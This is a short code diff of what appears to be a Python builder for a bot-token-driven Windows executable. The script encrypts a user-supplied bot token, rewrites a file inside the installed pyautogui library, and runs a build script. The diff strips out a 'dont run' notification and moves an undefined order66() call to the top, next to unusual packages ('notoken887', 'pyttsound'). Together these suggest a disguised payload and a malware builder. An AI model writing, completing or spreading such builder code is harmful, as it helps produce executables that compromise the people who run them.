@@ -1,7 +1,7 @@
 import os,sys
 from notoken887.encryptor import TokenCryptor
-from win10toast import ToastNotifier
 import pyttsound
+order66()
 os.system("color 4")
 bot_token=input("Enter your bot token: ")
 c=TokenCryptor()
@@ -15,6 +15,3 @@ for i,line in enumerate(lines):
 with open(pyautogui_path,"w",encoding="utf-8")as f:f.write("\n".join(lines))
 build_bat_path=os.path.join("l","build.bat")
 os.system(f'"{build_bat_path}"')
-order66()
-toaster=ToastNotifier()
-toaster.show_toast("exe built","the exe is done building, go check it out. dont run",duration=10)
